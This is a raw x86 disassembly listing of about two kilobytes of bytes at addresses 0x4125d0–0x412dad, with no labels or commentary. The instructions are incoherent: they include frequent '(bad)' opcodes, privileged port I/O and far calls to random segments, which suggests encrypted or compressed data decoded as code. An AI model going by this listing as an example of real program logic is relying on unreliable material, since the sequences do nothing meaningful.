  4125d0:	push   ss
  4125d1:	cmp    al,0x55
  4125d3:	push   esp
  4125d4:	mov    ah,0x1d
  4125d6:	icebp  
  4125d7:	sbb    eax,0x1d5a9706
  4125dc:	(bad)  
  4125dd:	jg     0x4125dd
  4125df:	pop    ebp
  4125e0:	fs jb  0x412635
  4125e3:	(bad)  
  4125e4:	jne    0x412626
  4125e6:	pop    ebp
  4125e7:	(bad)  
  4125e8:	loop   0x41263c
  4125ea:	push   ebp
  4125eb:	stos   DWORD PTR es:[edi],eax
  4125ec:	cs jb  0x412642
  4125ef:	out    dx,al
  4125f0:	int3   
  4125f1:	jp     0x412666
  4125f3:	mov    WORD PTR [edx-0x205fb3f8],cs
  4125f9:	mov    ecx,0x55f8dda8
  4125fe:	dec    edi
  4125ff:	push   edi
  412600:	je     0x41264c
  412602:	stc    
  412603:	and    al,BYTE PTR [edi+edi*2-0x7bceec7d]
  41260a:	sub    DWORD PTR [esi-0x2ca8f3],ebx
  412610:	sahf   
  412611:	sbb    DWORD PTR [ebx+0x69d13ab9],edi
  412617:	repz xor edi,DWORD PTR ds:0xea6b6ba6
  41261e:	(bad)  
  412620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412621:	lods   eax,DWORD PTR ds:[esi]
  412622:	dec    esi
  412623:	jmp    FWORD PTR [edx]
  412625:	dec    ebx
  412626:	sub    BYTE PTR [ebp-0x133e2eaf],0x6b
  41262d:	test   eax,0xbe1c781f
  412632:	jno    0x41267b
  412634:	out    0xef,eax
  412636:	cmp    edi,ebp
  412638:	push   0x7b8f3bad
  41263d:	dec    edi
  41263e:	std    
  41263f:	sub    DWORD PTR [esi+0x3bd07f83],0xffffff81
  412646:	mov    al,ds:0x463c128b
  41264b:	jnp    0x412684
  41264d:	lods   eax,DWORD PTR ds:[esi]
  41264e:	in     al,0x23
  412650:	jp     0x41264d
  412652:	(bad)  
  412653:	push   ds
  412654:	mov    al,0x4d
  412656:	in     al,dx
  412657:	sub    ebx,DWORD PTR [edx+0x68a1d079]
  41265d:	inc    ebx
  41265e:	jecxz  0x412636
  412660:	fcmovb st,st(5)
  412662:	add    DWORD PTR [edx-0x6bac1c28],0x293d40fd
  41266c:	outs   dx,DWORD PTR ds:[esi]
  41266d:	add    al,0x5e
  41266f:	or     ah,BYTE PTR [ecx]
  412671:	or     edi,DWORD PTR ds:0xd5afcf03
  412677:	adc    eax,0x6f5cd516
  41267c:	mov    dl,0x41
  41267e:	enter  0x56e3,0xb3
  412682:	mov    eax,ds:0xa9fd8baf
  412687:	sbb    dh,BYTE PTR [ecx+eiz*8+0x6ee89618]
  41268e:	popf   
  41268f:	call   0x8360:0x60e56dab
  412696:	out    dx,al
  412697:	mov    esp,0x7e32f6
  41269c:	xor    al,0x8d
  41269e:	add    bh,dh
  4126a0:	jp     0x4126c0
  4126a2:	sbb    esp,DWORD PTR [ebx-0x11]
  4126a5:	jge    0x4126c5
  4126a7:	inc    esp
  4126a8:	scas   eax,DWORD PTR es:[edi]
  4126a9:	sbb    eax,0x10ee50a3
  4126ae:	adc    BYTE PTR [edx-0x1763f71a],dh
  4126b4:	ja     0x4126fe
  4126b6:	pop    ebx
  4126b7:	xlat   BYTE PTR ds:[ebx]
  4126b8:	pushf  
  4126b9:	xlat   BYTE PTR ds:[ebx]
  4126ba:	in     eax,dx
  4126bb:	leave  
  4126bc:	cwde   
  4126bd:	int    0x7e
  4126bf:	cli    
  4126c0:	and    edi,DWORD PTR [eax-0x25]
  4126c3:	adc    ah,BYTE PTR [edx+ebx*8]
  4126c6:	push   edi
  4126c7:	mov    ah,0xa5
  4126c9:	test   eax,0xba90f328
  4126ce:	cmp    ah,cl
  4126d0:	sbb    eax,0x5d53272f
  4126d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126d6:	fmul   QWORD PTR [esi-0x22]
  4126d9:	push   0xffffff9f
  4126db:	imul   ebx,DWORD PTR ds:0xc500c1d0,0xe8fb975d
  4126e5:	push   ss
  4126e6:	fs sub esp,edi
  4126e9:	outs   dx,BYTE PTR ds:[esi]
  4126ea:	shl    ebp,0x8e
  4126ed:	xchg   ebp,eax
  4126ee:	sub    BYTE PTR ds:0x5c9ae321,dh
  4126f4:	test   BYTE PTR [edi+ecx*1],0x6e
  4126f8:	mul    bl
  4126fa:	test   eax,0x3e899c84
  4126ff:	mov    esp,0x80169f4c
  412704:	call   0x4eaf:0x625187a4
  41270b:	sbb    BYTE PTR [esi+0x39],ch
  41270e:	xor    ebp,DWORD PTR [eax]
  412710:	pop    ds
  412711:	lds    ecx,FWORD PTR [ecx-0x7659c81a]
  412717:	xchg   BYTE PTR [eax+0x334fd0ce],ah
  41271d:	test   DWORD PTR [ecx+ebp*4-0x11d23adc],edi
  412724:	inc    esp
  412725:	(bad)  
  412726:	ficom  WORD PTR [ebp+ecx*8-0x74]
  41272a:	push   ds
  41272b:	sub    esi,eax
  41272d:	pop    ss
  41272e:	push   edx
  41272f:	xor    esi,DWORD PTR [ebx]
  412731:	sub    BYTE PTR [esi],ah
  412733:	cld    
  412734:	out    0xae,eax
  412736:	push   es
  412737:	in     eax,dx
  412738:	cmp    eax,0x3548e81b
  41273d:	call   0xf78d:0xa063acac
  412744:	leave  
  412745:	xor    BYTE PTR [esi+ecx*8],0xad
  412749:	sbb    al,0xa2
  41274b:	inc    esp
  41274c:	ret    
  41274d:	es inc ebp
  41274f:	push   cs
  412750:	sub    bh,BYTE PTR [edx+0x1dc676a7]
  412756:	stos   DWORD PTR es:[edi],eax
  412757:	mov    ebx,ecx
  412759:	pushf  
  41275a:	sbb    edx,DWORD PTR [esi]
  41275c:	inc    ecx
  41275d:	xchg   edi,eax
  41275e:	loop   0x41271b
  412760:	aam    0xae
  412762:	sbb    ebx,edi
  412764:	fld    TBYTE PTR [ecx-0x6b31ca9e]
  41276a:	ret    0x9429
  41276d:	std    
  41276e:	sbb    BYTE PTR [esp+esi*2+0x63],0xee
  412773:	mov    ebx,0x8df716e4
  412778:	shl    dl,1
  41277a:	cmp    ecx,eax
  41277c:	adc    dl,ah
  41277e:	cmp    ecx,esp
  412780:	cmp    eax,0xfd59bab6
  412785:	push   esi
  412786:	fxch   st(0)
  412788:	popf   
  412789:	rol    DWORD PTR [edx-0x79],cl
  41278c:	mov    edx,0x912f32b9
  412791:	int3   
  412792:	in     eax,dx
  412793:	push   esi
  412794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412795:	and    al,al
  412797:	mov    ds:0x3ca28de4,eax
  41279c:	mov    dl,0x6
  41279e:	nop
  41279f:	and    al,0x2b
  4127a1:	pop    esp
  4127a2:	ins    DWORD PTR es:[edi],dx
  4127a3:	push   ebx
  4127a4:	in     eax,dx
  4127a5:	add    DWORD PTR [esi+0x46f35324],ebp
  4127ab:	mov    cl,0xb6
  4127ad:	mov    dh,0xe1
  4127af:	retf   
  4127b0:	push   0xffffffaf
  4127b2:	adc    eax,0xab142a24
  4127b7:	cwde   
  4127b8:	clc    
  4127b9:	sub    eax,0x979531b1
  4127be:	and    BYTE PTR [ebp-0x5b],0x70
  4127c2:	add    al,0x98
  4127c4:	mov    bh,0x98
  4127c6:	cld    
  4127c7:	mov    ah,0xb7
  4127c9:	push   esi
  4127ca:	aas    
  4127cb:	xlat   BYTE PTR ds:[ebx]
  4127cc:	dec    eax
  4127cd:	call   0x344c0448
  4127d2:	adc    BYTE PTR [ecx-0x574e115e],0xb2
  4127d9:	inc    esp
  4127da:	bound  eax,QWORD PTR [edx+0xd]
  4127dd:	or     BYTE PTR [ecx-0x1717d286],bl
  4127e3:	xor    ah,BYTE PTR [edi+0x52eb9361]
  4127e9:	sahf   
  4127ea:	cmp    BYTE PTR [edx+0x0],0xf7
  4127ee:	adc    BYTE PTR [esi],al
  4127f0:	or     al,0xf
  4127f2:	fstp   QWORD PTR [eax+0xed8868a]
  4127f8:	sbb    dh,BYTE PTR [edx-0x5e]
  4127fb:	jmp    0x8ff9c9e
  412800:	popa   
  412801:	fcomp  QWORD PTR [edx-0x3865fe3d]
  412807:	jo     0x41285d
  412809:	mov    al,0x7f
  41280b:	call   0x5afc:0x810b8297
  412812:	mov    BYTE PTR [edi+0x22],ch
  412815:	mov    eax,0xc2b84ae4
  41281a:	dec    edi
  41281b:	sub    dh,BYTE PTR [edx-0x7846f908]
  412821:	jo     0x41288a
  412823:	xchg   edx,eax
  412824:	outs   dx,DWORD PTR ds:[esi]
  412825:	jno    0x4127df
  412827:	mov    ds,WORD PTR [edx]
  412829:	push   ds
  41282a:	bound  edx,QWORD PTR [esp+ebx*2-0x2247974a]
  412831:	shr    DWORD PTR [ecx+0x5a],0x76
  412835:	lds    ecx,FWORD PTR [edi]
  412837:	lds    esi,FWORD PTR [ebx+0x63d74094]
  41283d:	xchg   edi,eax
  41283e:	jge    0x4127cb
  412840:	fcom   QWORD PTR [edx]
  412842:	cs push esi
  412844:	sub    eax,ecx
  412846:	shl    BYTE PTR [edx],0xdc
  412849:	jb     0x41281e
  41284b:	jmp    0x1a988235
  412850:	pop    edi
  412851:	sub    eax,DWORD PTR ds:0xaffdcc30
  412857:	mov    ebp,0x53d14cd3
  41285c:	fstp   QWORD PTR [ecx-0x7b956b0b]
  412862:	(bad)  
  412863:	repz sub cl,BYTE PTR [ecx+ebx*4]
  412867:	call   0x75ed:0x6879e69e
  41286e:	mov    DWORD PTR [ecx],eax
  412870:	adc    al,0x4f
  412872:	sub    DWORD PTR [ebp+0x5004a574],edi
  412878:	aaa    
  412879:	psubb  mm7,QWORD PTR [edx]
  41287c:	dec    ebx
  41287d:	(bad)  
  41287e:	stc    
  41287f:	sub    esi,DWORD PTR ds:0xbc69ab56
  412885:	jne    0x4128ec
  412887:	jns    0x412863
  412889:	adc    esp,DWORD PTR [esp+edi*8-0x1e7d5c3c]
  412890:	pop    edi
  412891:	inc    esp
  412892:	mov    ebx,0x4db6f6c2
  412897:	inc    edi
  412898:	in     al,0x4a
  41289a:	inc    esi
  41289b:	jl     0x41284a
  41289d:	xchg   ebp,eax
  41289e:	xchg   BYTE PTR [edx+0x29],bh
  4128a1:	popa   
  4128a2:	add    bh,ch
  4128a4:	mov    dh,cl
  4128a6:	jbe    0x4128c7
  4128a8:	mov    esp,0x175fb44c
  4128ad:	add    eax,DWORD PTR [eax+0x18]
  4128b0:	or     cl,BYTE PTR [ebx-0x56]
  4128b3:	out    dx,al
  4128b4:	test   eax,0x530b43ea
  4128b9:	mov    ch,0x46
  4128bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128bc:	xor    ch,BYTE PTR [edx+0xb]
  4128bf:	inc    ebp
  4128c0:	mov    bl,0x83
  4128c2:	mov    dl,0x7e
  4128c4:	or     ah,BYTE PTR [ebp-0x5b]
  4128c7:	sub    eax,0x8a0afd8d
  4128cc:	test   eax,0xfc923fe6
  4128d1:	stc    
  4128d2:	aas    
  4128d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128d4:	mov    eax,0xd0246b26
  4128d9:	and    eax,0x2a3acaad
  4128de:	push   0x9731e5eb
  4128e3:	ret    
  4128e4:	out    dx,eax
  4128e5:	xor    bh,BYTE PTR [ebx-0x607dbccb]
  4128eb:	push   esi
  4128ec:	sti    
  4128ed:	das    
  4128ee:	(bad)  
  4128ef:	jmp    0x4128bd
  4128f1:	pop    ecx
  4128f2:	or     BYTE PTR [ebp+0x62],0x36
  4128f6:	mov    edx,0x4290ec0c
  4128fb:	aam    0xa
  4128fd:	rcr    DWORD PTR [esi+eax*4+0x2],0x30
  412902:	je     0x41289a
  412904:	jo     0x41296f
  412906:	xchg   ebx,eax
  412907:	fsub   DWORD PTR ds:0x3601e6f4
  41290d:	stos   BYTE PTR es:[edi],al
  41290e:	call   0x241ba6a5
  412913:	arpl   WORD PTR [edi],si
  412915:	call   0x4dcd:0x8921c4e7
  41291c:	mov    ch,0x6e
  41291e:	fbld   TBYTE PTR [eiz*8-0x18537494]
  412925:	das    
  412926:	cmp    BYTE PTR [edi],dl
  412928:	xor    DWORD PTR cs:[edx],0xffffffc7
  41292c:	enter  0x2240,0x2d
  412930:	(bad)  
  412932:	sbb    BYTE PTR [edx+0x68a6efdb],0xad
  412939:	add    dh,0x71
  41293c:	mov    esi,0x6340077a
  412941:	push   0x7efba2be
  412946:	add    BYTE PTR [eax-0x64f3246],al
  41294c:	add    al,0xdd
  41294e:	dec    edi
  41294f:	(bad)  
  412950:	and    eax,0x76fd16c5
  412955:	and    eax,0x62fa438d
  41295a:	retf   0x2343
  41295d:	popa   
  41295e:	or     BYTE PTR [edi+0x52],bl
  412961:	dec    edi
  412962:	pop    ecx
  412963:	dec    ebx
  412964:	mov    esi,0xa867467a
  412969:	push   esi
  41296a:	jecxz  0x4129ac
  41296c:	pop    ds
  41296d:	adc    BYTE PTR [eax-0x40],al
  412970:	push   es
  412971:	aam    0x3e
  412973:	daa    
  412974:	mov    bl,ah
  412976:	loop   0x412970
  412978:	out    0x19,eax
  41297a:	mov    ch,0x5d
  41297c:	jae    0x41290c
  41297e:	mov    BYTE PTR [ebp-0x45a3744d],0x9
  412985:	add    BYTE PTR [edi+0x323a1a84],bh
  41298b:	sbb    dl,BYTE PTR [eax+0x19]
  41298e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41298f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412990:	add    BYTE PTR [edi+0x1],0x22
  412994:	cmp    ebp,edi
  412996:	mov    dl,0xf4
  412998:	xchg   ecx,eax
  412999:	repnz or BYTE PTR [edi],bl
  41299c:	retf   
  41299d:	imul   ebx,DWORD PTR ds:0x4db0a248
  4129a4:	jge    0x41296c
  4129a6:	out    0xaa,eax
  4129a8:	or     dl,ch
  4129aa:	pop    ebp
  4129ab:	pop    ebp
  4129ac:	ins    DWORD PTR es:[edi],dx
  4129ad:	or     al,0x5
  4129af:	mov    al,ds:0x8a860815
  4129b4:	(bad)  
  4129b5:	sbb    DWORD PTR es:[edi-0x4d],eax
  4129b9:	mov    esi,0x1bab5447
  4129be:	stc    
  4129bf:	cld    
  4129c0:	jmp    0x4727082e
  4129c5:	xor    eax,edi
  4129c7:	sbb    DWORD PTR [eax],ebp
  4129c9:	test   eax,0x6a17ca6f
  4129ce:	inc    ecx
  4129cf:	jb     0x412965
  4129d1:	push   edx
  4129d2:	pop    edx
  4129d3:	jle    0x4129e4
  4129d5:	out    0x66,al
  4129d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129d8:	ja     0x412974
  4129da:	push   edx
  4129db:	mov    dl,0x98
  4129dd:	adc    al,0xa4
  4129df:	mov    ebp,0xaa6eab01
  4129e4:	sbb    BYTE PTR [eiz*4+0x56c62d5f],ch
  4129eb:	push   ebp
  4129ec:	dec    ebp
  4129ed:	or     DWORD PTR [esi],edi
  4129ef:	outs   dx,DWORD PTR ds:[esi]
  4129f0:	add    eax,0xae299482
  4129f5:	leave  
  4129f6:	iret   
  4129f7:	and    al,0xc
  4129f9:	dec    eax
  4129fa:	sahf   
  4129fb:	pushf  
  4129fc:	or     ebp,edi
  4129fe:	shl    BYTE PTR [ecx+ebp*1+0x3b28df5e],1
  412a05:	push   ebp
  412a06:	mov    ch,0xd
  412a08:	lods   eax,DWORD PTR ds:[esi]
  412a09:	add    esp,edx
  412a0b:	mov    cl,0x24
  412a0d:	fs push eax
  412a0f:	daa    
  412a10:	add    esp,DWORD PTR ds:0xeae35aae
  412a16:	sub    DWORD PTR [ebx+0x0],esi
  412a19:	xchg   esp,eax
  412a1a:	in     eax,dx
  412a1b:	add    BYTE PTR [ebx],dl
  412a1d:	jae    0x412a64
  412a1f:	js     0x412a10
  412a21:	scas   al,BYTE PTR es:[edi]
  412a22:	(bad)  [ebx+0x10b8de97]
  412a28:	scas   eax,DWORD PTR es:[edi]
  412a29:	jno    0x4129d2
  412a2b:	push   es
  412a2c:	pushf  
  412a2d:	inc    ebp
  412a2e:	push   ebx
  412a2f:	xchg   ebp,eax
  412a30:	loopne 0x412a64
  412a32:	test   DWORD PTR [ebx],esi
  412a34:	jmp    0x6c043820
  412a39:	retf   0x23b1
  412a3c:	push   ecx
  412a3d:	dec    ebp
  412a3e:	mov    dh,0xe6
  412a40:	mov    esp,0xefb4efcd
  412a45:	cmp    esi,DWORD PTR ds:0xf1583b63
  412a4b:	jo     0x412a07
  412a4d:	xchg   edi,eax
  412a4e:	and    DWORD PTR [edi],edi
  412a50:	sbb    dl,dh
  412a52:	popa   
  412a53:	rol    DWORD PTR [esi-0x4c],0x77
  412a57:	xchg   esi,eax
  412a58:	adc    al,0x99
  412a5a:	fbld   TBYTE PTR [ebp+0x62]
  412a5d:	gs pop ebx
  412a5f:	push   cs
  412a60:	loopne 0x4129e7
  412a62:	mov    eax,0xe1ed31b6
  412a67:	jb     0x412a81
  412a69:	push   es
  412a6a:	pusha  
  412a6b:	and    BYTE PTR ds:0x3bed0776,ah
  412a71:	mov    bl,0x13
  412a73:	ja     0x412ab0
  412a75:	sbb    ch,dh
  412a77:	xchg   DWORD PTR [edi+0x24],esi
  412a7a:	push   cs
  412a7b:	inc    edx
  412a7c:	mov    BYTE PTR [esi+0x2b],bh
  412a7f:	lock dec ebx
  412a81:	push   cs
  412a82:	mov    eax,ds:0x8f05f5f6
  412a87:	iret   
  412a88:	mov    ds:0xc17972ed,eax
  412a8d:	nop
  412a8e:	mov    BYTE PTR [edi-0x51c8a43e],dl
  412a94:	or     esp,DWORD PTR [esp+ebp*4]
  412a97:	test   BYTE PTR [ebp-0x52ba9512],ah
  412a9d:	sub    al,0xdc
  412a9f:	fstp   QWORD PTR [esp+eax*2]
  412aa2:	xchg   ecx,eax
  412aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aa4:	(bad)  
  412aa5:	aad    0xc2
  412aa7:	ss inc ecx
  412aa9:	sub    al,0x15
  412aab:	imul   esi,DWORD PTR [ebp+0x37],0x62ed84b8
  412ab2:	cs pop ecx
  412ab4:	iret   
  412ab5:	sub    al,0x71
  412ab7:	xor    DWORD PTR [ebx],0xfffffff9
  412aba:	mov    dh,0xb4
  412abc:	aas    
  412abd:	jmp    FWORD PTR [ecx]
  412abf:	ins    DWORD PTR es:[edi],dx
  412ac0:	jg     0x412a80
  412ac2:	xchg   ebp,eax
  412ac3:	(bad)  
  412ac4:	nop
  412ac5:	in     eax,0xfc
  412ac7:	push   ebp
  412ac8:	push   ss
  412ac9:	push   0xffffff89
  412acb:	lds    esp,FWORD PTR [edx-0x30]
  412ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412acf:	in     al,0x27
  412ad1:	jae    0x412ae3
  412ad3:	out    0x2c,eax
  412ad5:	sbb    al,BYTE PTR [eax-0x4153ccc6]
  412adb:	aaa    
  412adc:	call   0x33e3:0x754ea3a9
  412ae3:	jb     0x412ad8
  412ae5:	outs   dx,BYTE PTR ds:[esi]
  412ae6:	adc    esi,DWORD PTR [eax]
  412ae8:	cmp    dl,al
  412aea:	call   0x58aa:0xb5550d3d
  412af1:	int    0x27
  412af3:	pusha  
  412af4:	mov    ds:0xa99a130e,eax
  412af9:	mov    ecx,0xee4a33e
  412afe:	int    0xd9
  412b00:	ins    BYTE PTR es:[edi],dx
  412b01:	loope  0x412b41
  412b03:	push   ebp
  412b04:	in     eax,0x9c
  412b06:	popa   
  412b07:	mov    al,BYTE PTR [esi+0x42]
  412b0a:	sbb    al,BYTE PTR [ecx+0x40f76094]
  412b10:	mov    bl,0xc1
  412b12:	and    eax,0xa350e6e3
  412b17:	retf   
  412b18:	sbb    bl,BYTE PTR [eax]
  412b1a:	xchg   ebp,eax
  412b1b:	mov    ?,WORD PTR [edx+eax*1-0x349a6703]
  412b22:	mov    bh,0xe0
  412b24:	ds (bad) 
  412b26:	fst    QWORD PTR [edx-0x1ed3fdd9]
  412b2c:	mov    ebp,0xa7d66d2b
  412b31:	or     DWORD PTR [ebp-0x47],ebx
  412b34:	dec    eax
  412b35:	loope  0x412b3d
  412b37:	mov    cl,0xdc
  412b39:	sar    dl,cl
  412b3b:	jne    0x412b9e
  412b3d:	scas   eax,DWORD PTR es:[edi]
  412b3e:	jl     0x412b0d
  412b40:	ins    BYTE PTR es:[edi],dx
  412b41:	aaa    
  412b42:	xchg   esi,eax
  412b43:	lea    edi,[ecx]
  412b45:	push   ecx
  412b46:	les    esi,FWORD PTR [esi]
  412b48:	xchg   ebp,eax
  412b49:	push   ds
  412b4a:	push   ss
  412b4b:	and    al,0x6b
  412b4d:	ficomp DWORD PTR [ebx-0x5db5eb9c]
  412b53:	dec    edi
  412b54:	jg     0x412bbf
  412b56:	adc    eax,0xf907ccbd
  412b5b:	fstp   QWORD PTR [ecx]
  412b5d:	adc    eax,0xf3fc3ea7
  412b62:	pushf  
  412b63:	fwait
  412b64:	adc    cl,BYTE PTR [ebx-0x1534d1b0]
  412b6a:	ret    
  412b6b:	sub    DWORD PTR [ebx+eiz*2-0x7e4206b8],esi
  412b72:	jmp    0xa8e4:0x859baf83
  412b79:	data16 (bad) 
  412b7b:	sahf   
  412b7c:	inc    eax
  412b7d:	xor    al,0x85
  412b7f:	mov    bh,BYTE PTR [esi+0x41c818a9]
  412b85:	mov    esi,DWORD PTR [esi]
  412b87:	pop    edi
  412b88:	jecxz  0x412bd6
  412b8a:	push   ebp
  412b8b:	in     eax,dx
  412b8c:	rcl    DWORD PTR [ecx-0x527ddd93],1
  412b92:	and    BYTE PTR [edi-0x21],ch
  412b95:	ins    BYTE PTR es:[edi],dx
  412b96:	push   ecx
  412b97:	mov    dh,0xb1
  412b99:	test   BYTE PTR [ebx-0x5d90ad8a],0x79
  412ba0:	and    eax,0x5e116a78
  412ba5:	push   eax
  412ba6:	xchg   dh,dl
  412ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ba9:	xor    al,0x56
  412bab:	ja     0x412bce
  412bad:	sbb    DWORD PTR [eax+0x51d0226c],edx
  412bb3:	sar    DWORD PTR [ebp-0x7222a30d],cl
  412bb9:	cmp    al,0x94
  412bbb:	leave  
  412bbc:	push   ebp
  412bbd:	lahf   
  412bbe:	xchg   BYTE PTR [edi],cl
  412bc0:	mov    eax,ds:0x1f43f6cb
  412bc5:	jne    0x412c3e
  412bc7:	pop    edi
  412bc8:	xor    bl,BYTE PTR [edi+0x62f56cb9]
  412bce:	inc    esp
  412bcf:	cli    
  412bd0:	js     0x412bc0
  412bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bd3:	xchg   ebp,eax
  412bd4:	sub    DWORD PTR [ecx+eiz*4+0x65c4a008],ebp
  412bdb:	sbb    BYTE PTR [ebx+0x6f],ah
  412bde:	and    eax,0xf56c6e74
  412be3:	or     DWORD PTR [esi-0x72],0x45
  412be7:	mov    DWORD PTR [eax+esi*4-0x76],ebx
  412beb:	jne    0x412b6f
  412bed:	dec    ecx
  412bee:	xor    DWORD PTR [edx-0x51],eax
  412bf1:	cmp    al,0x7f
  412bf3:	sub    ebx,edi
  412bf5:	cdq    
  412bf6:	cmp    esp,edi
  412bf8:	adc    eax,DWORD PTR [eax-0x69d018d5]
  412bfe:	jle    0x412c52
  412c00:	pop    ecx
  412c01:	jae    0x412bfa
  412c03:	dec    ecx
  412c04:	sub    eax,0xd32d9022
  412c09:	push   eax
  412c0a:	rol    BYTE PTR [esi+0x46],0xcd
  412c0e:	jg     0x412bd1
  412c10:	jae    0x412be6
  412c12:	inc    edx
  412c13:	add    esi,edx
  412c15:	add    eax,0x34989d48
  412c1a:	js     0x412bbc
  412c1c:	mov    cl,BYTE PTR [esi-0x240adf1e]
  412c22:	xor    eax,0xe78201b6
  412c27:	or     al,0x89
  412c29:	and    BYTE PTR [eax],ch
  412c2b:	aam    0xa8
  412c2d:	(bad)  
  412c2e:	cmp    al,0xae
  412c30:	test   dh,al
  412c32:	or     esi,DWORD PTR [esp+eax*4-0x11]
  412c36:	xchg   DWORD PTR [esi],esi
  412c38:	cmp    edi,DWORD PTR [edi]
  412c3a:	xor    edi,DWORD PTR [ebp-0x6b]
  412c3d:	in     al,dx
  412c3e:	add    eax,0xf64199c2
  412c43:	sub    BYTE PTR gs:[edi+0x20070bf1],0xf3
  412c4b:	jmp    0x412cac
  412c4d:	in     al,0x38
  412c4f:	test   al,0xf6
  412c51:	sbb    edi,DWORD PTR [esi]
  412c53:	rol    BYTE PTR [ecx-0x5e],0x3d
  412c57:	jo     0x412c23
  412c59:	repz (bad) 
  412c5b:	pop    edi
  412c5c:	mov    al,ds:0xf819da64
  412c61:	sbb    dl,BYTE PTR [edi+0x8168104]
  412c67:	(bad)  
  412c68:	mov    ecx,0xb630653d
  412c6d:	fist   DWORD PTR [ebx-0x5973f669]
  412c73:	and    edx,edx
  412c75:	icebp  
  412c76:	mov    ?,WORD PTR [eax-0x29]
  412c79:	fild   WORD PTR [edx+0x1a]
  412c7c:	pop    esi
  412c7d:	outs   dx,BYTE PTR ds:[esi]
  412c7e:	sub    al,0x7d
  412c80:	mov    BYTE PTR [ecx],dl
  412c82:	inc    esi
  412c83:	mov    esi,0x7cac58dd
  412c88:	or     ecx,eax
  412c8a:	test   ax,0x7def
  412c8e:	lods   eax,DWORD PTR ds:[esi]
  412c8f:	es push esp
  412c91:	retf   
  412c92:	or     eax,0x64da9239
  412c97:	mov    esi,0x2c5e12e0
  412c9c:	cli    
  412c9d:	scas   al,BYTE PTR es:[edi]
  412c9e:	jae    0x412c56
  412ca0:	stc    
  412ca1:	addr16 lahf 
  412ca3:	retf   
  412ca4:	push   ebx
  412ca5:	xchg   edi,eax
  412ca6:	adc    eax,0x79324c55
  412cab:	add    BYTE PTR [ebx],0xb4
  412cae:	or     edi,ebp
  412cb0:	stos   BYTE PTR es:[edi],al
  412cb1:	pop    ebp
  412cb2:	inc    eax
  412cb3:	pushf  
  412cb4:	push   esi
  412cb5:	enter  0xdac,0x32
  412cb9:	das    
  412cba:	lods   al,BYTE PTR ds:[esi]
  412cbb:	jp     0x412cf0
  412cbd:	jmp    FWORD PTR [ebp-0x1f]
  412cc0:	inc    ebx
  412cc1:	lods   al,BYTE PTR ds:[esi]
  412cc2:	pop    ebx
  412cc3:	mov    ds:0x21ee45d8,eax
  412cc8:	leave  
  412cc9:	outs   dx,DWORD PTR ds:[esi]
  412cca:	retf   0x6aa5
  412ccd:	xchg   DWORD PTR [edi],esp
  412ccf:	mov    ebp,0xeb479eaa
  412cd4:	and    ah,al
  412cd6:	push   ss
  412cd7:	nop
  412cd8:	or     ch,dl
  412cda:	pop    ss
  412cdb:	cwde   
  412cdc:	sbb    eax,0x665caea2
  412ce1:	test   DWORD PTR ds:0x3d88308,0x95cdc40
  412ceb:	(bad)  
  412cec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ced:	arpl   si,dx
  412cef:	inc    ebx
  412cf0:	and    eax,0x4441b3c3
  412cf5:	jo     0x412ce4
  412cf7:	inc    esi
  412cf8:	mov    edi,DWORD PTR [edx]
  412cfa:	jmp    0x217eced7
  412cff:	shl    BYTE PTR [edi],0xc4
  412d02:	dec    ecx
  412d03:	and    edi,DWORD PTR [eax-0x42489946]
  412d09:	xor    BYTE PTR [esi+eiz*2],bl
  412d0c:	ss jb  0x412d8a
  412d0f:	dec    edi
  412d10:	pop    ss
  412d11:	and    eax,0x1c137969
  412d16:	int3   
  412d17:	pop    ebx
  412d18:	pop    eax
  412d19:	mov    WORD PTR [ecx+0x62],ds
  412d1c:	push   0x75
  412d1e:	inc    ebp
  412d1f:	sub    eax,0xe5486e9d
  412d24:	jns    0x412da1
  412d26:	ss pop ds
  412d28:	outs   dx,DWORD PTR ds:[esi]
  412d29:	mov    esp,0x4f27e682
  412d2e:	mov    bl,0x77
  412d30:	jle    0x412d28
  412d32:	(bad)  
  412d33:	mov    eax,ds:0x8c913050
  412d38:	pop    ebp
  412d39:	rcr    DWORD PTR [ebp+0x5bc56163],cl
  412d3f:	push   edx
  412d40:	xor    esp,0x38
  412d43:	loopne 0x412d03
  412d45:	jno    0x412d42
  412d47:	mov    esi,0xace6770b
  412d4c:	stos   BYTE PTR es:[edi],al
  412d4d:	int3   
  412d4e:	aaa    
  412d4f:	scas   al,BYTE PTR es:[edi]
  412d50:	(bad)  
  412d51:	fld    DWORD PTR [esp+edi*8-0x32]
  412d55:	mov    ah,0xe9
  412d57:	test   al,0xc5
  412d59:	in     al,0x3f
  412d5b:	cdq    
  412d5c:	inc    eax
  412d5d:	outs   dx,BYTE PTR cs:[esi]
  412d5f:	jle    0x412dbf
  412d61:	sub    eax,0xf9139546
  412d66:	stc    
  412d67:	inc    ebp
  412d68:	es pop edx
  412d6a:	lods   al,BYTE PTR ds:[esi]
  412d6b:	mov    cl,0xa4
  412d6d:	mov    WORD PTR [edi],?
  412d6f:	adc    ebp,edi
  412d71:	mov    dl,BYTE PTR [edx-0x2a]
  412d74:	dec    edx
  412d75:	xor    BYTE PTR [edx-0x59186df9],bh
  412d7b:	out    dx,eax
  412d7c:	nop
  412d7d:	popa   
  412d7e:	ins    DWORD PTR es:[edi],dx
  412d7f:	leave  
  412d80:	sbb    BYTE PTR ds:0xacf28657,ah
  412d86:	js     0x412dc2
  412d88:	mov    ebp,0x3303b5ed
  412d8d:	mov    eax,ds:0x1b352f61
  412d92:	mov    ecx,0xc3fe0fb1
  412d97:	cmp    al,0xc6
  412d99:	jns    0x412d72
  412d9b:	push   ebx
  412d9c:	push   ebp
  412d9d:	imul   esp,eax,0x4ed5ccad
  412da3:	nop
  412da4:	inc    esi
  412da5:	shl    dh,0x62
  412da8:	retf   0x190
  412dab:	hlt    
  412dac:	xchg   ebp,eax
  412dad:	test   BYTE PTR [ebx],bl
